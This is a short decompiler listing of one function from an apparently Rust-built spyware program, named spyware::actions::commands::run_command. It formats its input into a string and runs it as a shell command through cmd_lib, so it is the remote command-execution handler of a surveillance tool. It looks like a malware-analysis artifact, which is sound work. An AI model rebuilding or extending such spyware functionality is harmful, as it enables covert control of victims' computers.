__int64 __fastcall spyware::actions::commands::run_command(__int64 a1, __int64 a2, __int64 a3)
{
  _BYTE v4[8]; // [rsp+8h] [rbp-70h] BYREF
  __int64 v5; // [rsp+10h] [rbp-68h]
  __int64 v6; // [rsp+18h] [rbp-60h]
  _QWORD v7[2]; // [rsp+20h] [rbp-58h] BYREF
  _QWORD v8[2]; // [rsp+30h] [rbp-48h] BYREF
  _QWORD v9[7]; // [rsp+40h] [rbp-38h] BYREF

  v7[0] = a2;
  v7[1] = a3;
  v8[0] = v7;
  v8[1] = <&T as core::fmt::Display>::fmt;
  v9[0] = &unk_11890;
  v9[1] = 1LL;
  v9[4] = 0LL;
  v9[2] = v8;
  v9[3] = 1LL;
  core::option::Option<T>::map_or_else(v4, v9);
  cmd_lib::run_fun(a1, v5, v6);
  return core::ptr::drop_in_place<alloc::string::String>(v4);
}